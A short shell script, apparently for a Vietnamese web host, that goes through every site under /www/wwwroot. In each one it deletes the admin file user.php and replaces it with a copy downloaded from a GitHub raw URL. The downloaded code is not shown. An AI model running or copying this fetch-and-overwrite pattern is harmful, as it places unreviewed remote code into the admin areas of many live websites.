root_directory="/www/wwwroot"

if [ -d "$root_directory" ]; then
  cd "$root_directory"
  for dir in */; do
    if [ -d "$dir" ]; then
      cd "$dir"
      cd giaodien1/views/admin
      rm -rf user.php
      curl -OL https://raw.githubusercontent.com/SPEED4G-Official/a/main/user.php
      chown www:www user.php
      cd "$root_directory"
    fi
  done
else
  echo "Thư mục gốc không tồn tại."
fi
